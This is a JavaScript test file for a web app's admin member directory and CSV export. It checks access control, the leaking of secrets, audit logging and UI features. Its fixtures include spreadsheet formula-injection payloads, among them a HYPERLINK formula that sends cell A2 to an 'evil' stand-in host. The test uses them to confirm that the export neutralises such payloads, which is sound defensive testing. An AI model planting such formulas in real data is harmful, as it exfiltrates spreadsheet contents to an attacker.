// The member database (2026-10-12): "The admin dashboard should include a
// database of all members and account information." Admins only, every
// member, account details — and never a password, a session or a Stripe id.
// v2 (2026-10-14): a directory grid and a tabbed record.
import { spawn } from "node:child_process";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { rmSync, mkdirSync, readFileSync } from "node:fs";
const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const DATA = join(ROOT, "test/.tmp/admin-members");
rmSync(DATA, { recursive: true, force: true }); mkdirSync(DATA, { recursive: true });
process.env.TNL_DATA = DATA;
const { db } = await import(join(ROOT, "src/db.js"));
const now = Date.now();
const U = (n, o = {}) => { const id = Number(db.prepare(`INSERT INTO users (username, display_name, email, password_hash, created_at, email_verified, is_admin, pronouns, links, stripe_account) VALUES (?,?,?,?,?,?,?,?,?,?)`)
  .run(n, o.name || n, n + "@x.com", "HASH-" + n, now - (o.ago || 0), o.verified ?? 1, o.admin ? 1 : 0, o.pronouns || "", JSON.stringify(o.links || []), o.stripe || "").lastInsertRowid);
  db.prepare(`INSERT INTO sessions (token, user_id, created_at) VALUES (?,?,?)`).run("tok-" + n, id, now); return id; };
U("boss", { admin: true });
U("ana", { pronouns: "she/her", links: [{ url: "https://ana.studio" }], stripe: "acct_SECRET123", verified: 0 });
U("evil", { name: "=HYPERLINK(\"http://bad\",\"x\")" });
db.prepare(`UPDATE users SET bio = ? WHERE username = 'ana'`).run('hi;=HYPERLINK("https://evil/?"&A2,"x")');
const many = db.prepare(`INSERT INTO users (username, display_name, email, password_hash, created_at, email_verified) VALUES (?,?,?,?,?,1)`);
for (let i = 0; i < 330; i++) many.run("m" + i, "Member " + i, `m${i}@x.com`, "h", now - i * 1000);

let pass = 0, fail = 0;
const t = (n, ok) => { ok ? pass++ : fail++; console.log("  " + (ok ? "✓" : "✗") + "  " + n); };
const PORT = 8875, B = `http://localhost:${PORT}`;
const srv = spawn(process.execPath, ["--experimental-sqlite", "--no-warnings", "src/server.runtime.js"], {
  cwd: ROOT, env: { ...process.env, TNL_DATA: DATA, PORT: String(PORT), STRIPE_SECRET_KEY: "", TNL_NO_VIDEO_FIX: "1", TNL_NO_WATCH: "1" }, stdio: "ignore" });
const get = (path, who) => fetch(B + path, { headers: who ? { authorization: "Bearer tok-" + who } : {} });
try {
  for (let i = 0; i < 100; i++) { try { if ((await fetch(B + "/api/health")).ok) break; } catch {} await new Promise((r) => setTimeout(r, 100)); }
  console.log("\nADMINS ONLY");
  t("signed out: no file", (await get("/api/admin/members.csv")).status === 401);
  t("a member: no file", (await get("/api/admin/members.csv", "ana")).status === 403);
  t("a member: no list", (await get("/api/admin/people?all=1", "ana")).status === 403);

  console.log("\nTHE DATABASE VIEW");
  const all = await (await get("/api/admin/people?all=1", "boss")).json();
  t("every member, not the first 300", all.people.length === 333 && all.total === 333);
  t("the list view still stops at 300", (await (await get("/api/admin/people", "boss")).json()).people.length === 300);
  const one = await (await get("/api/admin/people/ana", "boss")).json();
  t("a person's account: email, pronouns, links, member no., payouts started", one.person.email === "ana@x.com" && one.person.pronouns === "she/her"
    && one.person.links[0].url === "https://ana.studio" && Number.isInteger(one.person.id) && one.person.stripeConnected === true && one.person.payouts === false);
  const raw = JSON.stringify(one);
  t("…never the password, a session or the Stripe account id", !/HASH-|tok-ana|acct_SECRET/.test(raw));

  console.log("\nDOWNLOAD CSV");
  const r = await get("/api/admin/members.csv", "boss");
  const csv = await r.text();
  t("a spreadsheet file, named for today, not cached", r.status === 200 && /text\/csv/.test(r.headers.get("content-type")) && /tnl-labs-members-\d{4}-\d\d-\d\d\.csv/.test(r.headers.get("content-disposition")) && /no-store/.test(r.headers.get("cache-control")));
  const lines = csv.replace(/^﻿/, "").split("\r\n");
  t("a header and one row per member", lines.length === 334 && lines[0].startsWith("member_id,username,display_name,email,email_confirmed"));
  const ana = lines.find((l) => l.includes(",ana,"));
  t("account information in the row", ana && ana.includes("ana@x.com") && ana.includes(",no,") && ana.includes("she/her") && ana.includes("https://ana.studio") && ana.includes(",started,"));
  t("never a password hash, a session token or a Stripe id", !/HASH-|tok-|acct_SECRET|password/i.test(csv));
  t("a name that looks like a formula stays words", csv.includes(`"'=HYPERLINK(""http://bad"",""x"")"`));
  t("…and a bio with a ; in it stays one quoted cell (spreadsheets that split on ;)", csv.includes(`"hi;=HYPERLINK(""https://evil/?""&A2,""x"")"`));
  const log = db.prepare(`SELECT action FROM admin_log ORDER BY id DESC LIMIT 1`).get();
  t("every download is in the admin log", log && /downloaded the member database \(333 members\)/.test(log.action));

  console.log("\nIN /admin");
  const js = readFileSync(join(ROOT, "public/admin-app/3-people.js"), "utf8"), rec = readFileSync(join(ROOT, "public/admin-app/3-person.js"), "utf8");
  const html = readFileSync(join(ROOT, "public/admin.html"), "utf8");
  t("People is a directory: Table | Cards, choose columns, pages, summary numbers, Export CSV", js.includes('data-pview="table"') && js.includes('data-pview="cards"')
    && js.includes("data-pcol=") && js.includes('id="psize"') && js.includes('class="sum"') && js.includes('id="pcsv"'));
  t("…every row carries its member ID", all.people.every((u) => Number.isInteger(u.id)) && js.includes('["id", "ID"'));
  t("a member's record has tabs — Overview, Account, Activity, Notes — and sign-out / suspend kept apart", ['"overview", "Overview"', '"account", "Account"', '"activity", "Activity"', '"notes", "Notes"'].every((x) => rec.includes(x))
    && rec.includes('class="rc danger"') && rec.includes('data-pa="suspend"'));
  t("a phone starts People in Cards, a computer in Table; People has one search box", js.includes('(pwide() ? "table" : "cards")')
    && readFileSync(join(ROOT, "public/admin-app/1-core.js"), "utf8").includes('${TAB === "people" ? "" : `<div class="gsrch"'));
  t("…and /admin loads both", html.includes('src="/admin-app/3-people.js?v=4.0"') && /src="\/admin-app\/3-person\.js\?v=1\.[0-9]+"/.test(html));
} finally { srv.kill(); }
console.log(`\n  ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
